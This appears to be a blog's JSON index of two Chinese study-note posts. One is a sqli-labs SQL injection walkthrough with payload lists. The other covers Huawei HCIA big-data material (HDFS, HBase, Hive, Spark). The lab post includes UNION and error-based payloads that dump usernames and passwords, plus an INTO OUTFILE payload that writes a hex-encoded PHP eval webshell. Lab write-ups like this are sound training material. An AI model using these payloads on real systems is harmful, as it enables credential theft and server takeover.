[{"title":"SQL注入靶场sqli-labs","url":"/2022/04/24/SQL注入靶场sqli-labs/","content":"# sql注入\nSQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）\n\n## 常见的注入点\n- GET/POST/PUT/DELETE参数\n- X-Forwarded-For\n- 文件名\n- 4.1.2.2. Fuzz注入点\n- ' / \"\n- 1/1\n- 1/0\n- and 1=1\n- \" and \"1\"=\"1\n- and 1=2 \n- or 1=1\n- or 1=\n- ' and '1'='1\n- \\+ - ^ * % /\n- << >> || | & &&\n- ~\n- !\n- @\n- 反引号执行\n\n## 4.1.2.3. 测试用常量\n```bash\n@@version\n@@servername\n@@language\n@@spid\n@@database\n@@user\n@@version_compile_os\n```\n## 测试列数\n\n```bash\nhttps://www.xxx.com/index.asp?id=12+union+select+null,null--\n```\n\n## 报错注入\n```bash\n- select 1/0\n- select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a\n- extractvalue(1, concat(0x5c,(select user())))\n- updatexml(0x3a,concat(1,(select user())),1)\n- exp(~(SELECT * from(select user())a))\n- ST_LatFromGeoHash((select * from(select * from(select user())a)b))\n- GTID_SUBSET(version(), 1)\n```\n\n\n## 基于geometric的报错注入\n```bash\n- GeometryCollection((select * from (select * from(select user())a)b))\n- polygon((select * from(select * from(select user())a)b))\n- multipoint((select * from(select * from(select user())a)b))\n- multilinestring((select * from(select * from(select user())a)b))\n- LINESTRING((select * from(select * from(select user())a)b))\n- multipolygon((select * from(select * from(select user())a)b))\n其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 commit 95825f 。\n而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效。\n\n```\n\n## 堆叠注入\n- ;select 1\n\n## 注释符\n- --+\n- /*xxx*/\n- /*!xxx*/\n- /*!50000xxx*/\n\n\n## 判断过滤规则\n- 是否有trunc\n- 是否过滤某个字符\n- 是否过滤关键字\n- slash和编码\n\n## 获取信息\n- 判断数据库类型\n    - and exists (select * from msysobjects ) > 0 access数据库\n    - and exists (select * from sysobjects ) > 0 SQLServer数据库\n- 判断数据库表\n    - and exsits (select * from admin)\n- 版本、主机名、用户名、库名\n- 表和字段\n    - 确定字段数\n        - Order By \n        - Select Into\n    - 表名、列名\n    \n## 测试权限\n- 文件操作\n- 读敏感文件\n- 写shell \n- 带外通道\n- 网络请求\n\n[原文](https://websec.readthedocs.io/zh/latest/vuln/sql/fuzz.html)\n\n# sqli-labs\n\n## less-1\n    基于错误的字符串/数字注入\n\n判断注入点为数字注入\n```\n?id= -1\n```\n\n依次猜解字段数为3\n```bash\n?id= 1' order by  3 --+\n```\n![猜解字段数](img.png)\n\n\n联合构造回显位,-1是让前面为假\n```bash\n?id= -1' union select 1,2,3 --+ \n```\n![回显位](img_1.png)\n\n通过回显位查询用户名和数据库名\n```bash\n?id=-1' union select 1,user(),database() --+ \n```\n![回显位查询](img_2.png)\n\n查询所有库名\n```bash\n?id=-1' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+\n\ngroup_concat 分组\nschema_name 存储所有库信息的一个字段\ninformation_schema 存储所有库信息的一个库\ninformation_schema.schemata 存储所有库名的一个表 \n```\n![查询所有库名](img_3.png)\n\n\n查询security数据库的所有表名\n```bash\n?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security') ,3 --+ \n```\n![查询表名](img_4.png)\n\n查询users表的所有列\n```bash\n?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'users') ,3 --+ \n```\n![查询列名](img_5.png)\n\n查询用户名和密码\n```bash\n?id=-1' union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) --+ \n```\n![查询用户名和密码](img_6.png)\n\n## less-2\n\n同 less1,是数值型注入不需要闭合\n```bash\n?id=-1 union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) \n```\n\n## less-3\n源码\n```php\n$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n```\n\n需要构造闭合 `')`\n```bash\n?id=-1') UNION SELECT 1,(select group_concat(username) from security.users ),database() --+\n```\n\n## less-4\n源码\n```php\n$id = '\"' . $id . '\"';\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n$result=mysql_query($sql);\n```\n\n由 `\"`引起的注入,构造闭合 `\")`\n\n```bash\n?id=-1\") UNION SELECT 1,(select group_concat(username) from security.users ),database() --+\n```\n\n## less-5\n源码 \n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\tif($row)\n\t{\n  \techo '<font size=\"5\" color=\"#FFFF00\">';\t\n  \techo 'You are in...........';\n  \techo \"<br>\";\n    \techo \"</font>\";\n  \t}\n```\n\n由 `'` 引起注入,但是无回显\n\n- updatexml \n    - MySQL 5.1.5版本以上才支持该函数\n    - 返回的数据限制为32位,可以用substring函数进行数据位移偏转\n    - 对XML文档进行修改\n    - UPDATEXML (XML_document, XPath_string, new_value);\n    - 第一个参数：XML_document是String格式，为XML文档对象的名称\n    - 第二个参数：XPath_string (Xpath格式的字符串)\n    - 第三个参数：new_value，String格式，替换查找到的符合条件的数据\n    - 作用：改变文档中符合条件的节点的值\n- 写法\n```bash\n  select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n```\n\n- 实例\n```bash\n?id=1'  and (updatexml(1,concat(0x7e,(select substring(group_concat(password),1)from users),0x7e),1))--+\n```\n\n## less-6\n源码\n```php\n$id = '\"'.$id.'\"';\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n$result=mysql_query($sql);\n```\n\n此处使用 `\"` 闭合,正确返回Use outfile,错误返回You have an error in your SQL syntax\n\n\n## less-7\n源码\n```php\n$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n\tif($row)\n\t{\n  \techo '<font color= \"#FFFF00\">';\t\n  \techo 'You are in.... Use outfile......';\n  \techo \"<br>\";\n  \techo \"</font>\";\n  \t}\n\telse \n\t{\n\techo '<font color= \"#FFFF00\">';\n\techo 'You have an error in your SQL syntax';\n\t//print_r(mysql_error());\n\techo \"</font>\";  \n\t}\n```\n\n依旧没有回显,闭合符号换成 `'))`,使用`into outfile`写入shell\n\n```bash\n?id=-1')) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile \"/var/www/html/Less-8/shell.php\"--+\n```\n\n## less-8","tags":["sql注入"],"categories":["笔记"]},{"title":"华为HCIA","url":"/2022/04/20/华为HCIA/","content":"# 大数据概述&解决办法\n\n## 大数据的特征（5v+1c）\n- 大量：数据量巨大，MB,GB,TB,PB\n- 多样：数据类型多样，数据来源多样 数据来源：服务器日志、网站浏览信息、社交\\\n结构化数据：表格数据 平台、摄像头信息\\\n半结构化数据：网页html、xml\\\n非结构化数据：视频、音频、图片、文字\n- 高速：数据产生速度快、数据处理速度快\n- 价值：价值密度低\n- 准确：数据真实性\n- 复杂：数据产生速度快、数据的类型多样等特征，导致做数据处理时处理过程变得很复杂\n\n## 大数据处理流程\n数据采集->数据预处理->数据存储->分析挖掘->数据可视化\n\n### 大数据任务类型\n- IO密集型任务：大量输入输出请求的任务IO资源\n- 计算密集型任务：有大量的计算要求，CPU资源\n- 数据密集型任务：数据处理，并发数据处理\n\n## 大数据的计算类型（数据处理类型）\n- 批处理：一次处理一批量数据，处理的数据量大，但是延迟性高\n- 流处理：一次处理一条数据，处理的数据量小，但是延迟性低\n- 图处理：以图的形式展示数据，进行处理\n- 查询分析计算：检索功能\n\n## 大数据解决方案\nFusioninsight HD:部署在x86架构上\nBigData pro:部署在ARM架构上\nMapReduce Server（MRS）:部署华为云服务上\n- 高性能：支持自我研发的存储系统CarbonData\n- 易运维：提供了可视化的管理界面\n- 高安全：使用Kerborse & Ldap实现认证管理和权限管理\n- 低成本：按需购买，自定义配置底层架构性能\n\n# HDFS分布式文件系统\n\n## HDFS (Hadoop分布式文件系统)\n- 创建人:道格卡廷\n- 起始原因:开发一个搜索引擎-->存储问题(大量数据的存储)\n- google论文: GFS - google自身的分布式文件系统 `闭源`\n\n## HDFS特性\n理论上HDFS存储可以无限扩展\n- 分布式:把多节点的存储系统结合为一一个整体对外提供服务(提高存储能力)\n- 容错性:针对每个数据存储备份(默认3份)，备份存储分别存在不同的位置，如果备份或者数据有丢失，会再进行备份，保持一直都是3份\n- 按块存储:块大小默认128M, 一个文件可以存储在多个块,`但是一个块只存储一个文件` \\\n  `好处:数据丢失针对丢失的数据所属的块，只恢复当前块就可以`\n- 元数据:记录文件存储在哪些块,块存储在哪里等信息 \\\n  每个块都有一个元数据信息，并且元数据的大小是固定的150K\n  \n\n## HDFS适用场景\n- 可以做大文件\n- 可以协助离线处理或批处理\n- 流式数据访问机制\n\n## HDFS不适合做什么\n- 不适合大量小文件存储\n- 不适合做实时场景\n- 不适合随机读写，可以做追加写\n\n## `HDFS为什么不适合大量小文件存储`\n    (例: 10个文件，每个文件大小为20M)\n1. 10个文件需要使用10个块，并且每个块只是用了20M空间---> 存储空间浪费\n2. 有10个元数据，元数据150K\n3. 寻址时间增长\n\n不适合随机读写，可以做追加写\n\n\n## HDFS系统架构\n![HDFS系统架构](img.png)\n\n- Client (客户端) :用户接口，用户通过Client连接到组件\n- NameNode (名称节点，主节点) :管理DataNode,并且接收用户请求,分发任务，存储元数据信息\n- DataNode (数据节点，从节点) :实际处理用户请求，维护自己的Block和实际存储位置映射关系\n- Block (块) : 数据存储\n\n\n## HDFS单NameNode的问题\n- 单名称节点故障:整个集群都无法使用--->HA(主备配置)\n- 单名称节点性能瓶颈问题:并发处理的任务量有限---->联邦机制\n\n## HDFS HA特性(主备配置)\n\n![HA特性](img_1.png)\n- active节点:对外提供服务\n- standby节点:不断备份active节点的数据，`当active宕机,standby会成为新的active`\n- zookeeper监测主节点的状态，一旦发现故障，zookeeper就通知备用节点成为新的主节点\n\n\n## HDFS的联邦机制\n    各个NN之间是相互隔离的，维护自己的命名空间\n\n![联邦机制](img_2.png)\n\n\n## HDFS元数据持久化(主备同步)\n\n![元数据持久化](img_3.png)\n\n1. 备节点会通知主节点新建一个Editlog.new文件， 从这之后的操作都记录在.new文件中\n2. 备节点从主节点拷贝Editlog、Fsimage文件(只有第一 次需要 下载Fsimage,后续同步使用本地的)\n3. 将两个文件进行合并，生成Fsimage.ckpt文件\n4. 备节点将Fsimage.ckpt上传到主节点上\n5. 主节点接收到Fsimage.ckpt恢复成Fsimage\n6. 把Editlog.new重命名Editlog\n\n\n## HDFS副本机制 (3份)\n- 存储副本规则: \n1. 第一份副本存放在同一节点中(传输最快,但是如果节点故障，副本也会丢失)\n2. 第二份副本存放在同一机架的不同节点上(如果整个机架故障，副本也会丢失)\n3. 第三分副本存放在不同机架的其他节点上\n- 副本距离公式:`优先选择的是距离小的`\n1. 同节点的距离为0\n2. 同一机架不同节点的距离为2\n3. 不同机架的节点距离为4\n\n## HDFS读取流程\n![读取流程](img_4.png)\n\n1. Client向NameNode发起读取请求\n2. NameNode接收到请求，反馈对应的元数据信息给Client\n3. Client接收到反馈请求对应的DataNode `(如果Client本地有数据，优先从本地读取)`\n4. DataNode接收到请求，反馈数据内容给Client\n5. 关闭读取流\n\n## HDFS写入流程\n![写入流程](img_5.png)\n\n1. Client向NameNode发出写入请求\n2. NameNode接收到请求后生成该文件的元数据信息，反馈DataNode信息给Client\n3. Client接收到DataNode信息之后，请求相对应的DataNode\n4. Client提交文件写入到对应的DataNode\n5. DataNode接收到写入请求，执行写入\n6. Client写入第一-个节点后，由第一个节点写入第二个节点，第二个节点写入第三个节点\n7. 写入完成后反馈元数据信息给Client\n8. 关闭读取流，NameNode更新元数据信息\n\n# ZooKeeper\n    分布式服务应用，可以帮助其他分布式组件协调管理集群\n\n## ZooKeeper的特性\n- 分布式服务, ZooKeeper集群中有一半以上的节点存活集群才能正常运行\n- 最终一致性:所有的节点对外提供的是同一个视图\n- 实时性:实时获取、实时反馈应用状态\n- 可靠性: 一条数据被-个节点接收到，就会被其他节点也接收\n- 等待无关性:慢的或者失效的client请求，不会影响到其他客户端请求\n- 原子性:最终状态只有成功或者失败\n\n## ZooKeeper集群主从选举/主备切换\n- 选举: zookeeper内部投票选举,当节点得到一半以上的票数,它就会称为Leader,其他的节点都是Follower\n- 主备切换:当leader出现故障,从其他的follower中重新选举新的leader\n\n\n## ZooKeeper的容灾能力 \n    (可容灾集群最低要求是3个节点)\n- 在集群运行过程中允许发生故障的节点数(最大:节点数-半-1)\n- 如:集群只要1个节点，容灾能力为0\\\n    集群只要2个节点，容灾能力为0\\\n    集群只要3个节点，容灾能力为1\\\n    集群只要4个节点，容灾能力为1\n- 搭建集群时，尽量选择奇数台节点进行搭建\n\n## ZooKeeper的读特性\n![读特性](img_6.png)\n\n1. Client发起读取请求\n2. 获取到数据(不管接收请求的是Leader节点还是Follower节点)\n\n## ZooKeeper的写特性\n![写特性](img_7.png)\n\n1. Client发起写入请求 如果请求到的节点不是leader节点，follower会把请求转发给leader\n2. leader接收到请求后会向所有节点发出询问是否可以接收写入\n3. 节点接收到询问请求,根据自身情况反馈是否可写入的信息给leader\n4. leader接收到一半以上的节点可以写入，再执行写入\n5. 写入完成后反馈给client,如果Client请求的不是leader, leader把写 入状态反馈给follower,由follower反馈给client\n\n\n# MapReduce\n    数据处理(数据计算)\n    创建者:道格卡廷\n    出发点:搜索引擎-->处理问题google: mapreduce论文MapReduce的特性:分布式计算\n\n## MapReduce的特性:分布式计算\n- 高度抽象的编程思想:编程人员只需要描述做什么，具体怎么做交由处理框架执行的\n- 可扩展性:分布式、搭建在集群上的一-个处理组件\n- 高容错性:处理任务时节点故障，迁移到其他节点执行任务MapReduce任务主要分为两大部分: map任务、 reduce任务\n\n## MapReduce任务\n- reduce任务的处理数据来源是map任务的输出\n- map阶段:针对每个数据执行一个操作, 提取数据特征\n- reduce阶段:获取到多个map的输出，统一计 算处理,针对key统计汇总这个key对应的value\n\n## Map阶段详情\n![Map阶段详情](img_8.png)\n\n1. 数据从数据源获取后进行分片切分、执行map操作\n2. 分片会被存储在环形内存缓冲区( 当缓冲区达到80%会发生溢写)\n3. 把分片溢写到磁盘中，生成MOF文件\n4. 溢写过程中对数据执行\n\n## Map阶段详情\n![Reduce阶段详情](img_9.png)\n\n1. 把数据(MOF)从磁盘中加载到内存中\n2. 当数据量过大会执行归并，如果不多，直接跳过归并执行归约操作\n3. 执行完reduce操作之后，最终结果写入到HDFS\n\n\n## 词频统计案例(单词计数WordCount)\n1. 数据源(很多英文句子或短语的一个文件)\n2. 提取出每个单词,统计单词出现的次数\n![词频统计案例](img_10.png)\n\n\n## MapReduce缺点\n- 处理延迟性高\n- 使用java语言编程map处理reduce处理\n- MapReduce处理任务需要使用资源\n\n## MapReduce V1资源调度出现的问题\n- 如果发生问题，通知用户介入解决\n- 没有区分任务调度和资源调度，都是MR的主节点在处理，主节点的整体工作压力非常大\n- 因为资源没有单独隔离,容易出现资源抢占的问题\n\n\n# Yarn\n    资源调度管理服务---> 可以协助其他组件应用协调管理资源，以及任务调度\n\n## Yarn的系统架构\n    在集群层面来说只有一个ResourceManager, 多个NodeManager\n    以程序执行层面来说，一个应用只有一-个AppMaster,多个Container\n\n![Yarn的系统架构](img_11.png)\n\n- Client:客户端\n- ResourceManager (主节点) :负责资源管理,任务调度\n- NodeManager (从节点) :负责提供资源，实际任务执行\n- ApplicationMaster:特殊的Container, 管理同一应用的其他Container,以及实时关注任务执行状态,反馈给RM\n- Container:`资源的抽象`，被封装起来的资源，一个Container执行一个任务, 其他任务不能使用这个Container的资源\n\n\n## `MapReduce On Yarn任务处理流程`\n\n![MapReduce On Yarn任务处理流程](img_12.png)\n\n1. Client向RM发起请求\n2. RM(ApplicationManager)接收到请求后在NM中启动一-个AppMaster\n3. AppMaster接收任务，根据任务向RM (ResourceScheduler) 申请资源\n4. 在NM中封装资源Container提供给AppMaster执行应用\n5. 执行过程中Container会实时反馈执行状态给AppMaster\n6. AppMaster会反馈任务执行状态和自身状态给RM (ApplicationManager)\n7. AppMaster将运行结果反馈给RM,然后向RM (ResourceScheduler) 申请释放资源\n8. RM将任务情况反馈给Client\n\nYarn搭建时支持主备配置，实现主备ResourceManager\nAppMaster的容错(当-个AppMaster出现故障,任务管理会被迁移到新的AppMaster)\n\n![AppMaster的容错](img_13.png)\n\n# HBase\n    HBase分布式列式NoSQL数据库，底层存储使用的是HDFS ,`没有数据类型，所有数据存储都是字节数组的形式byte[]`\n    创建者:道格卡廷\n    出发点:搜索引擎-->提高数据读写速度--> BigTable\n\n## HBase的特性\n- 可扩展性:可以通过添加节点的方式增加数据存储空间\n- 高可靠性:底层使用HDFS,能够保证数据的可靠性，预写式日志保证内存中的数据不丢失\n- 高性能:处理PB级别的数据\n- 面向列: HBase数据存储是面向列的\n- 可伸缩性:动态添加列(在添加数据的时候)- \n\n## 面向列、面向行数据库的优缺点\n- 面向行:\\\n    优点:能方便快捷的获取一一行记录\\\n    缺点:在想要单独获取指定列数据的时候，会检索到其他无关列\n- 面向列:\\\n    优点:在检索单列数据时，不会出现无关列\\\n    缺点:想要查询一条记录时，需要多次IO请求才能拼出一条记录\n  \n\n\n## HBase和RDB (关系型数据库)的区别比较\n- 数据索引: \\\n  HBase只有一 种索引(rowkey)，RDB中可以配置多个索引\n- 数据维护: \\\n  HBase允许数据增删查,`不支持修改`，RDB中允许数据增删查改\\\n  HBase可以使用覆盖的方式写入数据以此实现数据修改的功能\n可伸缩性: HBase可以在添加数据时动态添加列，RDB只能通过修改表的方式添加列\nRDB (MySQL) 数据模型:数据库、表、行、列(字段)，单元格\n\n\n## HBase数据模型\n    命名空间、表、行、列(组成列族)、单元格(可以存储多条记录)\n- 命名空间: hbase、 default. 自定义(在使用自定义的命名空间时都需要指定命名空间名称)\n- 表:由行和列组成\n- 行:有一个唯一表示行键(rowkey)\n- 列:归属于某一个列族(`动态添加`)\n- 列族:由一个或多个列组成(创建表时创建的，不能动态更改)\n- 单元格:由行和列能确定-一个单元格，`一个单元格中可能存在多条记录(多版本记录，使用时间戳进行区分)`\n\n## HBase的表结构\n\n![HBase的表结构](img_14.png)\n\n    要找到行列对应的单元格值时，表行键,列族:列\n    默认情况下，只返回单元格中的最新记录，如果要返回多版本需要指定参数VERSIONS=>3\n\n## HBase系统架构\n\n![HBase系统架构](img_15.png)\n\n- Client:用户可以通过Client连接到HBase,基本不与HMaster交互\n- ZooKeeper:监测HMaster的主备运行状态及主备切换，监测HRegionServer的状态，反馈给HMaster,`存储HBase元数据信息hbase:meta`\n- Hmaster() ：管理维护HRegionServer列表，管理分配Region, Region负载均衡\n- HRegionServer：管理分配给它的Region，处理用户的读写请求\n- DFS Client: HBase连接到HDFS的接口\n\n一个HRegionserver中包含一个HLog， 多个HRegion\n\n- HLog:预写式日志WAL,记录数据操作(数据写入之前必须先写入HLog)\n- Region:`分布式存储的最基本单位，刚开始一个Region存储一个表的内容随着数据增多`，Region会不断分裂\\\nStore:一个Region中包含多个Store,`一个Store存储一个列族数据`\\\nMemStore (写缓存):一个Store包含一个MemStore \\\nStoreFile (磁盘文件):一个Store中包含多个StoreFile\\\nHFile (HDFS文件): 一个StoreFile添加头部信息转换成HFile,最终存储在HDFS中\n\n\n- 数据写入关键流程:先写入HLog,然后才能写入MemStore,当MemStore达到溢出要求(128M) ,将数据刷写StoreFile中\n- 数据读取关键流程:先读取MemStore,如果没有,再读取BlockCache (读缓存)，如果还是没有最终才读取StoreFile\\\n  BlockCache存储之前的用户查询过的数据，当MemStore和BlockCache中都没有数据， 需要从StoreFile\\\n  中读取数据时，读取完的数据会被加载到BlockCache中\n\n## Region拆分\n- 拆分原因:数据不断增加，region不断增大， region过大会影响数据读写速度\n- 拆分条件:根据行键拆分，尽可能将同一个行键或相似的行键放在一个Region中\n-region拆分过程很快，接近瞬间,在拆分时实际还是请求的原文件,拆分结束之后会将原文件内容异步写入新文件,然后之后的请求被转移到新文件\n\n## Region定位 \n  元数据信息存储在hbase:meta中,这个表信息被存储在zookeeper内存中通过元数据信息获取Region实际存储位置\n\n\n## HRegionServerBR\nH RegionServer出现故障时\n1. zookeeper发现RegionServer故障，同时HMaster\n2. HMaster获取故障的RegionServer上的HLog信息，根据与Region的对应关系对HLog进行拆分\n3. 把HLog存放在Region目录下，把Region重新迁移至其他的RegionServer上\n4. 其他的RegionServer接收到Region执行重新执行HLog内容\n\n## HLog的工作原理\n- HLog: WAL预写式日志，数据更新的操作都要先写入HLog中，才能写入MemStore\\\n`当MemStore被刷写到磁盘后，会向HLog中写入一条标记记录 (标记记录之前的所有数据都已经刷写到磁盘)`\n- 系统启动时，系统任务先扫描HLog, 检测是否有数据没有写入到磁盘中,如果有先执行写入MemStore,然后再刷写到磁盘，清空缓存,最后再为用户提供服务 \\\n  如果数据丢失，可以根据HLog重新执行恢复\n- 一个RegionServer只有一-个HLog (共用一个HLog)\\\n    优点:写入日志时不需要查找对应的Log,直接全部写入一个HLog\\\n    缺点:如果RegionServer出现故障， 需要对HLog进行拆分\n\n## 缓存刷写(把MemStore数据写入到StoreFile中)\n- 当MemStore达到刷写条件，就会将内容刷写到StoreFile文件中\n- 缓存的刷写是针对整个Region的，当一个MemStore达到刷写要求， 当前的Region下面的所有MemStore都会触发刷写\n- 每次刷写都会生成一个新的StoreFile文件(每次的刷写内容都分别在一个新文件中)\n- 刷写完成之后会在HLog中写入标记记录,并且清空缓存\n\n## StoreFile的合并\n    (刷写操作会出现大量的StoreFile,且部分StoreFile文件大小过小) 合并比较消耗资源,达到一定阈值才会执行\n    将多个的StoreFile小文件合并成一个大文件,如果StoreFile文件过大，再进行拆分(根据HDFS块进行拆分)\n\n![StoreFile的合并](img_16.png)\n\n合并文件会进行筛选:如果本身的StoreFile就已经达到1 00M左右,这个StoreFile是不参与合并的\n\n## HBase读取流程\n1. Client请求zookeeper获取hbase:meta表元数据信息，获取RegionServer信息\n2. Client请求相对应的RegionServer\n3. RegionServer接收到请求反馈数据给Client\n4. 关闭读取流\n\n## HBase写入流程\n1. Client请求的zookeeper,获取hbase:meta表信息,根据写入的行键获取对应的RegionServer信息\n2. Client请求RegionServer发起写入请求\n3. RegionServer接收到请求后将数据写入到行键对应的Region中.\n4. RegionServer反馈写入状态给Client\n5. 关闭写入流\n\n## BloomFilter (布隆过滤器)\n    判断数据是否存在，如果反馈结果为不存在，是可信的，如果反馈结果为存在，可能有误差\n\n缩小数据违取范围\n![布隆过滤器](img_17.png)\n\n在HBase中行键是以字典序进行排序\n![以字典序进行排序](img_18.png)\n\n\n## HBase Shell命令\n```sql\nnamespace:\n    create_namespace '名称'\n    list_namespace\n    list_namespace_ tables 'ns1'\n    alter_namespace 'ns1 ,{属性名称=> '属性值}\n    drop_ namespace 'ns1' ---命名空间需要是空的\n\nddl:数据定义语言---> 表层面的操作\n    create '表名',列族名1';列族2'\n    create '表名,{NAME= > '列族' VERSIONS= > 5},{NAME= >列族' ,VERSIONS= >5}\n    修改列族属性信息、添加列族: alter '表名',{NAME=> '列族' ,VERSIONS=>5}-->如果列族存在做修改，不存在做添加\n    使用list可以查看所有的表:包含default命名空间和自定义命名空间中的表\n    查看表信息: describe '表名'\n    删除表: drop '表名’--> 禁用状态的表才 能进行删除\n    禁用表: disable 表名' /启用表: enable '表名'\n    \ndml:数据管理语言--> 针对数据层面的操作\n    添加数据: put '表名，’行键\",列族:列\",值’--> 默认使用的是系统时间戳\n    删除数据: delete '表名\";行键’\n    delete表名',行键\"，列族:列'\n    delete表名';行键\",列族列,{TIMESTEMP= >'235652'}\n    清空表: truncate '表名'\n    数据获取: get '表名';行键’\n    get '表名'行键\";列族列\n    get '表名'，'行键\";列族列,{VERSIONS=>3}\n    数据扫描: scan '表名'\n    scan '表名\"';行键';列族列,VERSIONS= >3}\n\nsnapshot:快照操作--> 针对表创建快照，记录当前指定表的数据信息\n    创建快照: snapshot '表名\"，'快照名称'\n    还原快照: resotre_ snapshot '快照名'\n    克隆快照: clone_ snapshot ‘快照名;新表名' --->把快照中的表内容还原到一-张新表上\n    删除快照: delete snapshot '快照名'\n```\n\n\n# Hive\n    数据仓库，查询分析\n\n\n## Hadoop生态圈\n- HDFS存储、 HBase存储提供实时读写功能\n- MapReduce并行计算、Yarn资源管理和任务调度\n- ZooKeeper协助分布式应用管理服务\n- Hive底层使用的是MapReduce做计算，MapReduce的使用对编程人员要求比较高\n- 可以执行SQL类的查询分析计算\n\n## Hive数据模型\n![Hive数据模型](img_19.png)\n\n- 分区:根据字段值进行划分(指定分区字段,分区字段值相同的记录就存放在一一个分区中)\\\n分区在物理上是一个文件夹\\\n分区下还可以再有分区和桶\\\n在创建表的时候可以指定分区字段\\\n分区数量是不固定的\n  \n- 桶:根据值的哈希值进行求余放到对应的桶中\\\n桶在物理.上是一-个文件\\\n在创建表的时候可以指定有几个桶\n  \n- 表类型:托管表(内部表)、外部表、临时表\\\n托管表(internal) :元数据和数据信息都是Hive在管理\\\n`删除时，元数据和数据都会被删除\\`\n外部表(external) :元数据由Hive管理,但是数据可以提供给其他组件共享\\\n`删除时，只删除元数据，数据信息依旧保留\\`\n临时表(temporary) :只在当前会话中生效，当会话结束表就会被自动删除\n\n## Hive数据仓库分层`(逻辑分层)`\n- ODS (原数据层，操作数据层) :从数据源获取到的数据\n- DWD (数据明细层) :根据ODS做数据清洗得到的结果\n- DWS (数据服务层) :根据DWD进行汇总分析计算\n- ADS (应用服务层) :根据上层应用的业务需求将DWS数据再一次处理分析得到业务 需要的数据\n\n## Hive的分层处理的优势\n- 复杂问题简单化:将复杂问题分成多个流程，每个层面执行一-一个流程内容\n- 减少重复开发:不要每次提供给上次应用数据时都要对数据进行清洗汇总操作\n- 隔离原始数据:减少到原数据的依赖，避免因为原数据的原因，导致后续操作无法执行\n\n\n## Hive SQL的使用\n```sql\nDDL:数据定义语言\n    创建表: create table '表名(字段类型,字段2类类型... .);\n    create external table表名'(字段类型,字段2类型....\n    create temporary table '表名'(字段类型,字段2类型... .\n    修改表: alter table表名' rename to '新表名;\n    alter table '表名' addcolumns (字段类型);\n    删除表: drop table '表名';\n    查询数据库中的所有表: show tables;\n    查看表信息: describe table '表名';\n    \nDML:数据管理语言\n    添加数据:从文件中添加到表中\n    load data inpath HDFS路径into table表名\n    load data local inpath Linux路径into table表名\n    load data local inpath Linux路径overwrite into table表\n    \n    从一个表添加到另-一个表中\n    insert into table 表名 select * from 原表 where条件;\n    from 原表 insert into table 表名 select * where 条件\n    from 原表 insert overwrite table 表名 select 字段 where 条件\n    从表中导出到文件中\n    insert into directory HDFS路径 select * from表\n    insert into local directory Linux 路径select * from 表\n    export table 表 to HDFS路径\n    \nDQL:数据查询语言\n    标准查询: select * from表名\n    分组: select * from 表名 group by字段\n    排序: select * from 表名 order by字段desc\n    多表联合查询: select * from (select * from 表 a join 表b  on a.id= b.id)\n    \n创建表时的特殊操作\n    分区: partitioned (字段类型)\n    指定列分隔符: row format delimited fields terminated by '分隔符'\n    指定外部表的存储路径: location 路径\n    指定外部表的存储类型: stored as textfile\n    指定字段加密: ROW FORMAT SERDE\n    'org.apache.hadoop.hive.serde2.lazy.LazySimpleSerDe' WITH SERDEPROPERTIES(\n    'column.encode.columns'='字段1,字段\n    2'column.encode.classname' ='org apache.hadoop.hive.serde2.AESRewriter);\n```\n\n# Spark\n\n## Spark特点\n    轻快灵巧Spark的处理能力是MapReduce的30倍，处理能力不容易受到任务量增加的影响\n轻:底层代码只有3万行，使用的函数式编程语言scala\n快:处理速度快\n灵:提供很多不同层面的处理功能\n巧:巧妙的应用Hadoop平台\n\n\n## RDD:分布式数据集、可分区的\n- 具有血统机制(RDD由父RDD执行操作之后产生)\n- 如果子RDD丢失，RDD故障，重新执行父RDD就可以重新得到的子RDD\n- RDD默认存储在内存中，如果内存不足的时候，发生溢写\n- Spark节点会分配60%的内存用于做缓存，40%执行内存\n\n\n## 依赖类型\n    宽依赖、窄依赖\n- 窄依赖:父RDD的每个分区都只会被`一个`子RDD的分区所依赖\n- 宽依赖:父RDD的每个分区可能会被`多个子RDD的分区所依赖`\n\n## Stage划分\n    遇到窄依赖就加入，宽依赖就断开，剩余的所有RDD被放在一个Stage中\n\n## RDD操作类型\n- 创建操作:创建RDD用于接收数据结果\n- 原始RDD:读取数据源获得的RDD (readFile(path))\n- 转换得来:通过父RDD执行操作后得到的子RDD\n- 控制操作:持久化RDD,可以持久化到内存或磁盘中,默认存在内存\n- 转换操作:可对RDD执行的处理操作，转换操作是懒惰的，转换操作并不是立马执行，遇到行动操作才执行\n- 行动操作:实际调用Spark执行(存储文件,数据输出等)\n\n\n- transformation算子在整个程序中 ->声明转换操作,实际并没有执行\n- action算子时， 会从第一-个操作开始执行\n- DataFrame:属于一个DataSet实例， 不可变的弹性分布式数据集，存储数据时不止存储数据内容,存储数据对应结构信息及类型\n- DataSet:以对象的形式存储数据集，DataFrame= DataSet[Row]\n\n## RDD、DataFrame、 DataSet数据集的联系\n![数据集的联系](img_20.png)\n\n\n## Spark体系架构\n![Spark体系架构](img_21.png)\n\n- 集群部署形式: \\\n  Standalone: spark自 己管理资源调度\\\n  Spark On Yarn:使用yarn做资源管理调度 \\\n  Mesos: AMR实验室开发的资源管理器，最适用于Spark的资源管理器\n- Spark Core:处理核心\n- Spark SQL:处理结构化数据，使用Hive元数据\n- Spark Streaming:实时流处理(实际微批处理) , 